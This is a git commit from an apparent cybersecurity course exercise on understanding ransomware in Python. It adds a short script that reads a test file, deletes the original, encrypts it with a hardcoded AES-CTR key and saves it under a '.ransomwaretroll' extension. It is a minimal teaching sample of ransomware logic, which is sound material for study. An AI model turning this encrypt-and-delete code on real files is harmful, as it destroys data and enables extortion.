2caffe167e713900036e3ff438ace5568de1d134
Marcel Donin <83168668+marceldonin@users.noreply.github.com>
2023-10-28 19:19:15 -0300

    Resolução DESAFIO 02
    DESAFIO 02 - Entendendo um Ransomware na Prática com Python

---
+++ DESAFIO 02/encrypter.py
@@ -0,0 +1,27 @@
+## encrypter.py
+## https://github.com/marceldonin/Formacao-Cybersecurity-Specialist/tree/main/DESAFIO%2002
+
+import os
+import pyaes
+
+## abrir o arquivo a ser criptografado
+file_name = "teste.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+## remover o arquivo
+os.remove(file_name)
+
+## chave de criptografia
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+## criptografar o arquivo
+crypto_data = aes.encrypt(file_data)
+
+## salvar o arquivo criptografado
+new_file = file_name + ".ransomwaretroll"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
